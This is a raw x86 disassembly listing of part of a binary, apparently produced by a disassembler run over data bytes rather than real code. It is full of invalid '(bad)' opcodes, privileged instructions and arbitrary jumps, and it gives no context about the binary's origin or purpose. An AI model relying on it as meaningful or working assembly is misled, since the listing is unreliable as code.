  41938b:	fadd   DWORD PTR [edx]
  41938d:	push   ds
  41938e:	sbb    eax,0xfd106f9e
  419393:	shl    ebp,cl
  419395:	cmc    
  419396:	mov    ah,0xa6
  419398:	adc    eax,0x31d13a6f
  41939d:	shl    DWORD PTR [ebp-0x78],cl
  4193a0:	(bad)  
  4193a1:	out    0x39,eax
  4193a3:	and    al,0xec
  4193a5:	dec    esi
  4193a6:	lods   eax,DWORD PTR ds:[esi]
  4193a7:	cwde   
  4193a8:	pop    ss
  4193a9:	pop    edi
  4193aa:	inc    ebp
  4193ab:	push   0x12
  4193ad:	ror    eax,0x8a
  4193b0:	cmp    dl,dl
  4193b2:	les    ebx,FWORD PTR [edi]
  4193b4:	pop    ecx
  4193b5:	cmp    ch,BYTE PTR es:[esi+eiz*4]
  4193b9:	mov    al,ds:0x3243e7bb
  4193be:	mov    bh,0x11
  4193c0:	mov    ecx,0x14b2ffae
  4193c5:	rol    DWORD PTR [edi-0x63],cl
  4193c8:	jno    0x419431
  4193ca:	std    
  4193cb:	rol    BYTE PTR [ebx+0x51c4c977],0x3b
  4193d2:	jbe    0x419363
  4193d4:	cld    
  4193d5:	outs   dx,BYTE PTR ds:[esi]
  4193d6:	loopne 0x4193ca
  4193d8:	add    BYTE PTR [ebx+0xa],cl
  4193db:	jb     0x419412
  4193dd:	pop    esi
  4193de:	jg     0x41944a
  4193e0:	add    esp,0x7988fd47
  4193e6:	dec    esp
  4193e7:	stos   DWORD PTR es:[di],eax
  4193e9:	ficom  WORD PTR [eax+ebx*1+0x9]
  4193ed:	loopne 0x419398
  4193ef:	xchg   ebp,eax
  4193f0:	mov    al,0xd4
  4193f2:	mov    eax,ds:0x74f11b25
  4193f7:	cmp    al,BYTE PTR [ecx-0x1b]
  4193fa:	push   ss
  4193fb:	xchg   ecx,eax
  4193fc:	ret    
  4193fd:	jp     0x419405
  4193ff:	data16 and al,0xa9
  419402:	xchg   ebx,eax
  419403:	xchg   BYTE PTR [ebx+0x23c24e93],al
  419409:	pop    edi
  41940a:	jge    0x4193f2
  41940c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41940d:	pop    ebp
  41940e:	clc    
  41940f:	sbb    ecx,ecx
  419411:	stc    
  419412:	add    DWORD PTR ds:0xfb309fbd,ebp
  419419:	push   ebx
  41941a:	jp     0x4193bf
  41941c:	dec    eax
  41941d:	pop    ebp
  41941e:	js     0x419469
  419420:	mov    eax,0x5a77d1bd
  419425:	out    dx,eax
  419426:	push   esi
  419427:	add    eax,0xf76cee39
  41942c:	xor    al,0x13
  41942e:	int3   
  41942f:	popa   
  419430:	lahf   
  419431:	lahf   
  419432:	xor    ebp,DWORD PTR [esi+0x1fe44042]
  419438:	pop    es
  419439:	dec    ecx
  41943a:	sbb    DWORD PTR [ebx],ebx
  41943c:	test   al,0xce
  41943e:	jmp    0x11522dd
	...
  4194b3:	add    BYTE PTR [ecx-0x7],al
  4194b6:	mov    ebx,ebx
  4194b8:	mov    ebx,0x95fb51fb
  4194bd:	fidivr WORD PTR [ebx+0x2c]
  4194c0:	int    0x58
  4194c2:	dec    eax
  4194c3:	int3   
  4194c4:	mov    dh,0x12
  4194c6:	add    DWORD PTR [eax],eax
  4194c8:	test   BYTE PTR [eax],0x0
  4194cb:	add    bh,cl
  4194cd:	pop    ss
  4194ce:	int    0x74
  4194d0:	inc    esp
  4194d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194d2:	mov    ebp,0x85e18664
  4194d7:	xor    al,0x70
  4194d9:	std    
  4194da:	jecxz  0x419480
  4194dc:	loope  0x4194fb
  4194de:	fstp   DWORD PTR [edi+0x19e184c7]
  4194e4:	mov    ebx,0x3282af1
  4194e9:	push   esp
  4194ea:	and    ebp,ecx
  4194ec:	push   ss
  4194ed:	sub    ebp,esp
  4194ef:	fwait
  4194f0:	imul   eax,DWORD PTR [edi+0x6b4e3bd1],0x937c6e2f
  4194fa:	pop    esp
  4194fb:	add    eax,0xeec45a33
  419500:	push   ss
  419501:	fdivr  DWORD PTR [esi+0x7a]
  419504:	add    DWORD PTR [ecx+eax*8],edi
  419507:	dec    eax
  419508:	(bad)  
  41950a:	pop    edi
  41950b:	lods   eax,DWORD PTR ds:[esi]
  41950c:	sub    BYTE PTR [eax-0x5cea443],0x5a
  419513:	lahf   
  419514:	shl    BYTE PTR [ebx+0x762094e2],0x56
  41951b:	outs   dx,DWORD PTR ds:[esi]
  41951c:	cld    
  41951d:	out    0x82,al
  41951f:	fs pop dx
  419522:	and    BYTE PTR [edx+0x49a1d752],dh
  419528:	icebp  
  419529:	int3   
  41952a:	fidivr DWORD PTR es:[edi-0x13]
  41952e:	inc    eax
  41952f:	and    dl,BYTE PTR [edi+0x27]
  419532:	(bad)  
  419533:	fistp  QWORD PTR ds:0xe61d6101
  419539:	xor    DWORD PTR [edx+0x4da61889],eax
  41953f:	in     eax,dx
  419540:	mov    esp,DWORD PTR [ebp-0x3ccc256c]
  419546:	cld    
  419547:	stos   DWORD PTR es:[edi],eax
  419548:	cmp    BYTE PTR [edi-0x4989d653],0xb0
  41954f:	mov    cr5,edi
  419552:	and    BYTE PTR [ebp+ecx*8+0x8a64de1],0xc0
  41955a:	xor    al,0xa8
  41955c:	xor    al,0x5f
  41955e:	mov    ebx,0x8fbe810d
  419563:	xor    DWORD PTR [eax],esi
  419565:	mov    ecx,ebx
  419567:	into   
  419568:	xchg   ecx,eax
  419569:	adc    ah,BYTE PTR [esi]
  41956b:	es cmc 
  41956d:	popa   
  41956e:	xchg   DWORD PTR [ecx-0x4c8d74f0],ebp
  419574:	sub    dh,BYTE PTR gs:[edi+0x4511a4ec]
  41957b:	data16 xlat BYTE PTR ds:[ebx]
  41957d:	cld    
  41957e:	cli    
  41957f:	mov    dh,BYTE PTR [edi]
  419581:	jg     0x419530
  419583:	or     bl,BYTE PTR [ecx+0x7523109d]
  419589:	loop   0x419562
  41958b:	data16 loopne 0x4195bb
  41958e:	mov    cs,WORD PTR [esi-0x35845178]
  419594:	daa    
  419595:	aam    0xe1
  419597:	cmp    DWORD PTR [eax+0x338da031],edi
  41959d:	inc    ebp
  41959e:	adc    edi,DWORD PTR [esp+ecx*2-0x6a4b60a9]
  4195a5:	fucomp st(3)
  4195a7:	jmp    0x419615
  4195a9:	cli    
  4195aa:	or     bh,al
  4195ac:	test   eax,0x25b6d5f4
  4195b1:	mov    ch,0x19
  4195b3:	(bad)  
  4195b4:	imul   edi,ebp,0xffffff82
  4195b7:	adc    DWORD PTR [ebx+0x5704a25c],esp
  4195bd:	ficomp WORD PTR ds:0xaaa2c8
	...
  419633:	add    BYTE PTR [ebx-0x44c35fd8],dl
  419639:	mov    esp,0xad76af9f
  41963e:	or     esp,DWORD PTR [eax+0x4734293b]
  419644:	lods   al,BYTE PTR ds:[esi]
  419645:	adc    eax,DWORD PTR [ecx]
  419647:	add    dh,dh
  419649:	add    BYTE PTR [eax],al
  41964b:	add    ah,bl
  41964d:	inc    esp
  41964e:	or     ecx,DWORD PTR [ecx-0x71]
  419651:	mov    BYTE PTR [eax+0x42],ch
  419654:	out    0x41,eax
  419656:	das    
  419657:	addr16 je 0x419604
  41965a:	ret    
  41965b:	add    edi,ebp
  41965d:	pop    edi
  41965e:	dec    ecx
  41965f:	lahf   
  419660:	pushf  
  419661:	pop    ecx
  419662:	jg     0x4196e1
  419664:	int3   
  419665:	mov    ecx,0xe8bc5043
  41966a:	das    
  41966b:	call   0x709c:0x3eca18b
  419672:	inc    esi
  419673:	retf   0xfc84
  419676:	int    0x27
  419678:	mov    al,0x2a
  41967a:	ins    DWORD PTR es:[edi],dx
  41967b:	jbe    0x419612
  41967d:	add    BYTE PTR [esi+0xa],0xfb
  419681:	mov    esi,0x94f39a37
  419686:	sub    bl,BYTE PTR [ecx]
  419688:	retf   
  419689:	loopne 0x4196f9
  41968b:	mov    al,ds:0x23a627d7
  419690:	popa   
  419691:	dec    esi
  419692:	push   esi
  419693:	(bad)  
  419694:	add    ecx,DWORD PTR [eax]
  419696:	mul    DWORD PTR ds:[esi-0x66a1ff0a]
  41969d:	adc    ebx,edi
  41969f:	mov    eax,DWORD PTR [esi+0x40e5f801]
  4196a5:	js     0x4196de
  4196a7:	not    ah
  4196a9:	out    dx,al
  4196aa:	pop    ds
  4196ab:	dec    esp
  4196ac:	jns    0x419665
  4196ae:	enter  0x7e90,0xfb
  4196b2:	push   esp
  4196b3:	das    
  4196b4:	pop    edi
  4196b5:	pop    eax
  4196b6:	fidivr WORD PTR [ebx+0x6f2bd6b6]
  4196bc:	dec    ebp
  4196bd:	ret    
  4196be:	pop    esi
  4196bf:	dec    ebx
  4196c0:	sti    
  4196c1:	sbb    esp,ebp
  4196c3:	lock and BYTE PTR [ebp+0x48],dl
  4196c7:	pop    eax
  4196c8:	or     eax,0x8eb05e7
  4196cd:	mov    ch,dl
  4196cf:	leave  
  4196d0:	out    dx,eax
  4196d1:	jmp    0xb1c1c2ee
  4196d6:	stos   BYTE PTR es:[edi],al
  4196d7:	out    0x3d,al
  4196d9:	and    DWORD PTR [eax+0x62],0x89328e0e
  4196e0:	mov    esi,0x773b1cc1
  4196e5:	pop    esp
  4196e6:	xchg   esi,eax
  4196e7:	add    ebx,0xd66f909a
  4196ed:	fidiv  DWORD PTR [esi]
  4196ef:	int3   
  4196f0:	fnstenv ds:0x6b6be06a
  4196f6:	(bad)  
  4196f7:	loop   0x419712
  4196f9:	or     esi,ecx
  4196fb:	test   BYTE PTR [eax-0x41c31c91],ah
  419701:	clc    
  419702:	xchg   BYTE PTR [ebx-0x52],ah
  419705:	adc    DWORD PTR [esi+edi*2],ebx
  419708:	mov    ch,0xe8
  41970a:	push   ds
  41970b:	dec    ebx
  41970c:	pop    esp
  41970d:	loope  0x419727
  41970f:	pop    ss
  419710:	mov    al,ds:0x2b01876d
  419715:	popa   
  419716:	jb     0x419722
  419718:	xchg   bp,ax
  41971a:	xor    BYTE PTR [eax+eax*8+0x10ea7308],cl
  419721:	inc    esi
  419722:	ins    DWORD PTR es:[edi],dx
  419723:	dec    eax
  419724:	scas   al,BYTE PTR es:[edi]
  419725:	xor    BYTE PTR [eax-0x80],cl
  419728:	add    eax,0x7d7ee61f
  41972d:	ret    0x1c3f
  419730:	scas   al,BYTE PTR es:[edi]
  419731:	sub    DWORD PTR ds:0xc8491b6f,ecx
  419737:	jb     0x41975e
  419739:	and    BYTE PTR [ecx+0x59],dh
  41973c:	sub    ebx,ecx
  41973e:	pushf  
  41973f:	pusha  
  419740:	popa   
  419741:	and    BYTE PTR [eax],al
	...
  4197b3:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4197ba:	hlt    
  4197bb:	fist   WORD PTR [ecx-0x32d83417]
  4197c1:	mov    al,ds:0x14a2dad7
  4197c6:	add    DWORD PTR [eax],eax
  4197c8:	test   BYTE PTR [eax],0x0
  4197cb:	add    cl,bh
  4197cd:	xor    BYTE PTR [ebp+0x7d],ch
  4197d0:	ds or  BYTE PTR ds:[eax+0x64d8c359],dl
  4197d8:	popf   
  4197d9:	xlat   BYTE PTR ds:[ebx]
  4197da:	(bad)  
  4197db:	sar    ebx,cl
  4197dd:	test   eax,0xfb9aae8d
  4197e2:	mov    al,ds:0xc78a9a7
  4197e7:	xchg   edi,eax
  4197e8:	jmp    0x18cab384
  4197ed:	jo     0x4197c7
  4197ef:	out    dx,eax
  4197f0:	push   ecx
  4197f1:	jne    0x41977e
  4197f3:	jecxz  0x4197dd
  4197f5:	pop    eax
  4197f6:	fcmovne st,st(2)
  4197f8:	adc    BYTE PTR [edi-0x3b],ah
  4197fb:	xchg   ecx,eax
  4197fc:	xchg   ebx,eax
  4197fd:	inc    esp
  4197fe:	and    eax,0x4d7153b7
  419803:	xchg   edx,eax
  419804:	mov    ds:0xf8f33ed5,eax
  41980a:	sub    al,0xa9
  41980c:	push   edx
  41980d:	xlat   BYTE PTR ds:[ebx]
  41980e:	mov    ebp,0x66ca80a1
  419813:	bound  eax,QWORD PTR [ebx+0x6ff2477b]
  419819:	dec    esp
  41981a:	mov    dh,BYTE PTR [eax-0x2f3848cd]
  419820:	inc    ecx
  419821:	popf   
  419822:	sbb    BYTE PTR [ebp+0xa],dl
  419825:	pop    es
  419826:	xor    edx,esp
  419828:	pop    ss
  419829:	outs   dx,DWORD PTR ds:[esi]
  41982a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41982b:	rol    ecx,cl
  41982d:	outs   dx,BYTE PTR ds:[esi]
  41982e:	fcomp  DWORD PTR [eax]
  419830:	adc    ch,BYTE PTR [ebx-0x6c9870c5]
  419836:	push   cs
  419837:	loop   0x419822
  419839:	jb     0x419886
  41983b:	add    BYTE PTR [edi],0xf4
  41983e:	adc    eax,0xef0085c3
  419843:	dec    ebp
  419844:	daa    
  419845:	xchg   esp,eax
  419846:	or     ch,bh
  419848:	clc    
  419849:	test   BYTE PTR [edi-0x12],0xf7
  41984d:	cmp    DWORD PTR [edi],eax
  41984f:	sub    DWORD PTR [esi-0x4d],0x29
  419853:	sub    bh,BYTE PTR [edx-0x30]
  419856:	sub    al,0x16
  419858:	add    BYTE PTR [ecx],bh
  41985a:	xor    edx,DWORD PTR [edx+0x7]
  41985d:	nop
  41985e:	stos   DWORD PTR es:[edi],eax
  41985f:	std    
  419860:	popa   
  419861:	(bad)  
  419862:	lods   al,BYTE PTR ds:[esi]
  419863:	scas   eax,DWORD PTR es:[edi]
  419864:	sub    BYTE PTR [eax],ah
  419866:	jo     0x419841
  419868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419869:	test   DWORD PTR [si+0x61],esp
  41986d:	sub    BYTE PTR [eax-0x1a60968c],ah
  419873:	out    0xf6,al
  419875:	inc    esi
  419876:	jb     0x4198af
  419878:	popa   
  419879:	jno    0x4198c5
  41987b:	pusha  
  41987c:	jno    0x419853
  41987e:	fsubr  DWORD PTR [ebp-0x14]
  419881:	(bad)  
  419882:	clc    
  419883:	cmp    eax,0xdd93a5ca
  419888:	cmp    DWORD PTR [esi-0x514f725f],ebx
  41988e:	sbb    DWORD PTR [edx-0x23],0xba50f335
  419895:	sbb    BYTE PTR [esi+edi*1+0x673725a3],0x9d
  41989d:	adc    ch,BYTE PTR [edx]
  41989f:	xor    BYTE PTR [ebx+ebx*8],0xd0
  4198a3:	fs xchg si,ax
  4198a6:	mov    esp,0x5a0fdf6c
  4198ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198ac:	dec    ecx
  4198ad:	in     eax,0xb5
  4198af:	test   DWORD PTR [ebp+0x32],ebx
  4198b2:	(bad)  
  4198b3:	out    dx,eax
  4198b4:	xchg   BYTE PTR cs:[ebx],bl
  4198b7:	sub    al,0xa2
  4198b9:	sahf   
  4198ba:	and    eax,0x762dc094
  4198bf:	mov    cl,0x29
  4198c1:	mov    ds:0x0,eax
	...
  419932:	add    BYTE PTR [eax],al
  419934:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  41993a:	into   
  41993b:	fwait
  41993c:	test   BYTE PTR [ecx-0x28],0x94
  419940:	fiadd  WORD PTR [eax+esi*1]
  419943:	sahf   
  419944:	cwde   
  419945:	adc    eax,0xf60001
  41994a:	add    BYTE PTR [eax],al
  41994c:	aaa    
  41994d:	(bad)  
  41994e:	mov    ecx,0xf2bf5631
  419953:	shr    BYTE PTR [ecx-0x4f],0xbf
  419957:	cdq    
  419958:	out    0x3e,eax
  41995a:	sub    DWORD PTR [eax],0xffffff9e
  41995d:	stos   BYTE PTR es:[edi],al
  41995e:	and    dl,BYTE PTR [eax]
  419960:	jmp    0xbf44:0xa9337fbb
  419967:	dec    ebx
  419968:	adc    esp,0xfb49e96b
  41996e:	jne    0x41994a
  419970:	lock into 
  419972:	jnp    0x419938
  419974:	in     eax,dx
  419975:	jnp    0x4199d5
  419977:	or     al,0xae
  419979:	xchg   esi,eax
  41997a:	adc    ecx,0x83d32f0e
  419980:	sub    BYTE PTR [eax+0x16],0xb7
  419984:	jns    0x419928
  419986:	in     eax,0x55
  419988:	call   0x8af3d65e
  41998d:	or     eax,DWORD PTR [edi-0x3a]
  419990:	jo     0x419924
  419992:	ja     0x419985
  419994:	mov    ebp,0xc321ae64
  419999:	mov    ch,0x6f
  41999b:	hlt    
  41999c:	aam    0xbf
  41999e:	iret   
  41999f:	push   ebx
  4199a0:	test   ebx,edi
  4199a2:	pop    esi
  4199a3:	jmp    0x4199d6
  4199a5:	add    bh,BYTE PTR [edx+0x3353ff2]
  4199ab:	out    dx,eax
  4199ac:	adc    DWORD PTR [esi+0x77ba57be],edx
  4199b2:	inc    esi
  4199b3:	cwde   
  4199b4:	push   0xffffffb3
  4199b6:	enter  0x25a4,0x75
  4199ba:	sbb    ebp,DWORD PTR [edi]
  4199bc:	in     eax,0xc2
  4199be:	call   0xae65:0x7bdc95d3
  4199c5:	mov    dh,0xfa
  4199c7:	xchg   esp,edi
  4199c9:	cmp    DWORD PTR ds:0x210fdd6e,ebx
  4199cf:	mov    eax,ds:0xb798358e
  4199d4:	mov    DWORD PTR [esi-0x5d393214],0x9c80a728
  4199de:	mov    eax,0xa02b8df8
  4199e3:	iret   
  4199e4:	pop    esi
  4199e5:	retf   0xf7f6
  4199e8:	cld    
  4199e9:	jo     0x4199a6
  4199eb:	in     al,0xec
  4199ed:	inc    ecx
  4199ee:	cli    
  4199ef:	fadd   QWORD PTR [edi]
  4199f1:	push   esi
  4199f2:	sub    BYTE PTR [ebx],cl
  4199f4:	mul    DWORD PTR [eax]
  4199f6:	cmp    al,0x22
  4199f8:	xchg   ebp,eax
  4199f9:	or     eax,0x42df6dd
  4199fe:	dec    esi
  4199ff:	idiv   DWORD PTR [ebx+eiz*2-0x6cd627c6]
  419a06:	aaa    
  419a07:	and    eax,0xaa71a7e4
  419a0c:	fstp   QWORD PTR [edx]
  419a0e:	inc    ebp
  419a0f:	popa   
  419a10:	push   ss
  419a11:	cmp    eax,0x4234ad1e
  419a16:	nop
  419a17:	push   esi
  419a18:	add    eax,0x75cd621d
  419a1d:	(bad)  
  419a1e:	repnz fadd st(4),st
  419a21:	jmp    0x1ea7:0xcc72fd7d
  419a28:	xor    BYTE PTR ds:0x4eafda40,bh
  419a2e:	push   ebx
  419a2f:	mov    ebx,0x60206106
  419a34:	call   0x31e:0x55aca53
  419a3b:	push   cs
  419a3c:	push   0xb22092f3
  419a41:	jb     0x419a43
	...
  419ab3:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  419ab7:	xor    ch,bh
  419ab9:	mov    dh,0xff
  419abb:	pop    edi
  419abc:	mov    ebp,0xeb357b47
  419ac1:	retf   0x51c1
  419ac4:	mov    ss,WORD PTR [esi]
  419ac6:	add    DWORD PTR [eax],eax
  419ac8:	test   BYTE PTR [eax],0x0
  419acb:	add    BYTE PTR [edx],dl
  419acd:	or     DWORD PTR [ebp-0x10c12d62],esp
  419ad3:	aam    0xb4
  419ad5:	in     al,0x34
  419ad7:	icebp  
  419ad8:	je     0x419b47
  419ada:	retf   0xb35c
  419add:	dec    esp
  419ade:	mov    bl,0x95
  419ae0:	or     edi,DWORD PTR [edx+ebx*4+0x78]
  419ae4:	cli    
  419ae5:	iret   
  419ae6:	or     eax,DWORD PTR [ebx+0x403a74a]
  419aec:	sub    ebx,DWORD PTR [eax-0x5d6d7855]
  419af2:	pop    edi
  419af3:	pop    ebx
  419af4:	or     eax,0xe85fbdbd
  419af9:	arpl   WORD PTR [esi+0x3b],si
  419afc:	mov    esi,DWORD PTR [eax]
  419afe:	xor    al,BYTE PTR gs:[ebx-0x7c]
  419b02:	jmp    0x419b7d
  419b04:	(bad)  
  419b05:	std    
  419b06:	dec    ecx
  419b07:	xchg   DWORD PTR [ecx+edi*1-0x56],edx
  419b0b:	cs inc esp
  419b0d:	or     DWORD PTR [ebx+0x3854fa5],edx
  419b13:	sbb    BYTE PTR [edx+0x58b79497],ch
  419b19:	dec    esi
  419b1a:	icebp  
  419b1b:	jmp    0x777a:0xbb9f0bfd
  419b22:	xchg   esi,eax
  419b23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b24:	push   0x99a2dc79
  419b29:	mov    ch,0xb0
  419b2b:	xor    al,0xa8
  419b2d:	(bad)  
  419b2e:	add    eax,0x628adb98
  419b33:	(bad)  
  419b34:	xchg   ebp,eax
  419b35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b36:	push   0x8
  419b38:	sub    ah,ch
  419b3a:	lods   eax,DWORD PTR ds:[esi]
  419b3b:	loope  0x419ba3
  419b3d:	rcr    DWORD PTR [edx],0x56
  419b40:	fnstcw WORD PTR [edx]
  419b42:	or     eax,0x6ad9ffd9
  419b47:	fstp   TBYTE PTR [esi]
  419b49:	xchg   edi,eax
  419b4a:	sub    dl,BYTE PTR [edx]
  419b4c:	mov    cl,0x8f
  419b4e:	mov    ch,0x1e
  419b50:	aas    
  419b51:	pop    eax
  419b52:	or     edi,DWORD PTR [eax]
  419b54:	nop
  419b55:	aad    0xee
  419b57:	sub    eax,0x777e408f
  419b5c:	or     BYTE PTR [ebx-0x27],0xa3
  419b60:	inc    ecx
  419b61:	mov    eax,ds:0xf6def082
  419b66:	jne    0x419b71
  419b68:	push   ds
  419b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b6a:	push   es
  419b6b:	repnz stc 
  419b6d:	cli    
  419b6e:	xchg   esp,eax
  419b6f:	fs dec ebp
  419b71:	or     al,0x12
  419b73:	pusha  
  419b74:	arpl   WORD PTR [ebx-0x31a41cbf],bx
  419b7a:	in     al,0xc0
  419b7c:	test   BYTE PTR [edi+0x66459a0e],dl
  419b82:	sbb    al,0x6d
  419b84:	fimul  WORD PTR [eax]
  419b86:	mov    esi,0x6cbbb38d
  419b8b:	pop    ss
  419b8c:	stos   BYTE PTR es:[edi],al
  419b8d:	cld    
  419b8e:	out    dx,al
  419b8f:	mov    WORD PTR [edi],ss
  419b91:	or     DWORD PTR [edi-0x70d85752],0xb29ae773
  419b9b:	sbb    bh,0x8b
  419b9e:	popf   
  419b9f:	test   dl,dh
  419ba1:	cmc    
  419ba2:	clc    
  419ba3:	je     0x419bc7
  419ba5:	xchg   ebp,eax
  419ba6:	shl    DWORD PTR [ecx+edx*8+0x4e],1
  419baa:	int3   
  419bab:	xchg   DWORD PTR [ecx-0x2ec41080],edx
  419bb1:	xor    DWORD PTR [eax-0x66f758b6],ebp
  419bb7:	addr16 inc ebp
  419bb9:	aam    0x1d
  419bbb:	pop    esp
  419bbc:	inc    ebp
  419bbd:	aaa    
  419bbe:	jo     0x419bd4
  419bc0:	dec    ebp
  419bc1:	jno    0x419bc3
	...
  419c33:	add    bl,bh
  419c35:	inc    edx
  419c36:	out    dx,al
  419c37:	aas    
  419c38:	(bad)  
  419c39:	mov    edi,0x157c6fb
  419c3e:	sub    esi,0xfffffff1
  419c41:	dec    ebp
  419c42:	and    eax,0x117849c
  419c47:	add    dh,dh
  419c49:	add    BYTE PTR [eax],al
  419c4b:	add    BYTE PTR [ebp-0x74],dl
  419c4e:	xchg   esi,eax
  419c4f:	test   DWORD PTR [ebx],edx
  419c51:	ins    BYTE PTR es:[edi],dx
  419c52:	std    
  419c53:	fnstenv [edi+0xa]
  419c56:	or     eax,0x85a9f15f
  419c5b:	xchg   edx,eax
  419c5c:	cmp    edi,DWORD PTR [eax+0x59]
  419c5f:	mov    bh,0x9a
  419c61:	xchg   DWORD PTR [ebp-0x7f7a6cf5],eax
  419c67:	jecxz  0x419c8f
  419c69:	je     0x419c22
  419c6b:	adc    eax,DWORD PTR [edi]
  419c6d:	inc    eax
  419c6e:	xor    ah,BYTE PTR [edx-0x14fb3d65]
  419c74:	repz mov cl,0x51
  419c77:	inc    edx
  419c78:	outs   dx,BYTE PTR ds:[esi]
  419c79:	fwait
  419c7a:	sar    eax,0x9c
  419c7d:	inc    ebx
  419c7e:	dec    ebx
  419c7f:	dec    DWORD PTR [edi]
  419c81:	push   ss
  419c82:	inc    ebx
  419c83:	mov    ecx,0x9e27e7bd
  419c88:	sbb    BYTE PTR [ecx+0x55],0x46
  419c8c:	(bad)  
  419c8d:	call   0xf8af45b3
  419c92:	addr16 jae 0x419c4e
  419c95:	ret    0xee5f
  419c98:	and    BYTE PTR [edi+0x728bcf2f],dh
  419c9e:	dec    ebp
  419c9f:	or     DWORD PTR [edx-0x1a9be96a],0xff0dde3e
  419ca9:	(bad)  
  419caa:	in     al,dx
  419cab:	in     eax,dx
  419cac:	mov    BYTE PTR [esi-0x7a86f425],dh
  419cb2:	xor    eax,DWORD PTR [ebx-0x36]
  419cb5:	stos   BYTE PTR es:[edi],al
  419cb6:	ror    BYTE PTR [ebp-0x44],1
  419cb9:	sub    esi,ecx
  419cbb:	mov    esp,0xdfbb8615
  419cc0:	fs add al,0xc6
  419cc3:	add    al,0xbf
  419cc5:	(bad)  [ebx]
  419cc7:	cld    
  419cc8:	mov    eax,DWORD PTR [esi-0x57]
  419ccb:	xchg   DWORD PTR ds:0x2e5ef5fc,ecx
  419cd1:	and    eax,ebx
  419cd3:	test   al,0x95
  419cd5:	jb     0x419ca5
  419cd7:	push   0x13181c9b
  419cdc:	inc    edi
  419cdd:	(bad)  
  419cde:	fwait
  419cdf:	leave  
  419ce0:	cli    
  419ce1:	add    DWORD PTR [eax-0x72],eax
  419ce4:	test   eax,0x3d69112b
  419ce9:	in     al,0x43
  419ceb:	dec    esi
  419cec:	pushfw 
  419cee:	jp     0x419d24
  419cf0:	jns    0x419d1f
  419cf2:	test   eax,0x5dcf8a08
  419cf7:	push   esi
  419cf8:	mov    ch,0xeb
  419cfa:	mov    edi,0x23deb58
  419cff:	mul    DWORD PTR [edx]
  419d01:	hlt    
  419d02:	stc    
  419d03:	clc    
  419d04:	pop    ebx
  419d05:	jne    0x419d05
  419d07:	test   DWORD PTR [ecx-0x12aba46d],esi
  419d0d:	retf   0x9a76
  419d10:	mov    edi,0x2a862d2e
  419d15:	mov    ah,0x3b
  419d17:	and    BYTE PTR [ebx+0x6a],ah
  419d1a:	lea    ebx,[esi+0x5c]
  419d1d:	mov    esi,0x9ca55052
  419d22:	jmp    0x697f:0xbc1bff48
  419d29:	jb     0x419cf7
  419d2b:	inc    edi
  419d2c:	dec    edi
  419d2d:	leave  
  419d2e:	xchg   DWORD PTR [ebx-0x94a2296],esi
  419d34:	popa   
  419d35:	xchg   BYTE PTR [eax-0x55d4f2d7],bl
  419d3b:	popa   
  419d3c:	or     al,0xe
  419d3e:	test   DWORD PTR [ebx],ecx
  419d40:	lds    eax,FWORD PTR ss:[eax]
	...
  419db3:	add    BYTE PTR [esi],cl
  419db5:	bnd call 0xde7c99eb
  419dbb:	(bad)  
  419dbc:	jp     0x419e27
  419dbe:	xchg   edi,eax
  419dbf:	inc    esp
  419dc0:	push   ss
  419dc1:	dec    edx
  419dc3:	je     0x419e3f
  419dc5:	sbb    BYTE PTR [ecx],al
  419dc7:	add    dh,dh
  419dc9:	add    BYTE PTR [eax],al
  419dcb:	add    BYTE PTR [ecx-0x424591dc],bl
  419dd1:	mov    cl,0xa7
  419dd3:	pop    edi
  419dd4:	inc    ebx
  419dd5:	add    dl,BYTE PTR [eax-0x2b2f1bd]
  419ddb:	sbb    ecx,DWORD PTR [ebp+0x30]
  419dde:	mov    bh,0xb8
  419de0:	das    
  419de1:	dec    edi
  419de2:	xchg   ecx,eax
  419de3:	sub    ebp,DWORD PTR [eax+0x5e]
  419de6:	cdq    
  419de7:	fwait
  419de8:	push   ecx
  419de9:	fldenv [esi]
  419deb:	add    eax,0xba05e9c3
  419df0:	lea    ecx,[ebp+edx*4-0x3b]
  419df4:	sub    DWORD PTR [esi+0x4a36170b],0xffffff9e
  419dfb:	call   edi
  419dfd:	into   
  419dfe:	push   0xffffff9b
  419e00:	data16 repz jg 0x419e67
  419e04:	push   ds
  419e05:	push   eax
  419e06:	lods   al,BYTE PTR ds:[esi]
  419e07:	adc    eax,0x601e6d8
  419e0c:	cmp    al,0xfb
  419e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e0f:	fdiv   DWORD PTR [ebx-0x3edbcdc8]
  419e15:	cwde   
  419e16:	mov    edx,0x8521e718
  419e1b:	push   cs
  419e1c:	or     dl,ah
  419e1e:	dec    ebx
  419e1f:	add    DWORD PTR ds:0xa0bc75f5,edx
  419e25:	adc    edi,DWORD PTR [ebx+eax*1]
  419e28:	aas    
  419e29:	loop   0x419e09
  419e2b:	fsubrp st(0),st
  419e2d:	cmp    bl,BYTE PTR ds:0x45208d7e
  419e33:	test   al,0x23
  419e35:	push   esp
  419e36:	inc    ebp
  419e37:	ffree  st(2)
  419e39:	xchg   DWORD PTR [esi+0x64],edi
  419e3c:	xlat   BYTE PTR ds:[ebx]
  419e3d:	rcl    BYTE PTR [esi+ebp*4-0x33],0x44
  419e42:	add    dh,ch
  419e44:	rcr    ah,cl
  419e46:	or     eax,0x81ecf512
  419e4b:	(bad)  
  419e4c:	(bad)  
  419e4e:	push   es
  419e4f:	xchg   esi,eax
  419e50:	sar    BYTE PTR [ebx],1
  419e52:	(bad)
  419e56:	mov    cl,al
  419e58:	cdq    
  419e59:	inc    esp
  419e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e5b:	jo     0x419e9d
  419e5d:	push   ecx
  419e5e:	sbb    BYTE PTR [esi-0x7a8ac411],al
  419e64:	mov    al,0x30
  419e66:	sar    BYTE PTR [edx+edi*1-0x9],0x43
  419e6b:	push   ds
  419e6c:	imul   edi,edx,0xcb648e41
  419e72:	mov    cl,0xc5
  419e74:	stos   BYTE PTR es:[edi],al
  419e75:	into   
  419e76:	push   ebx
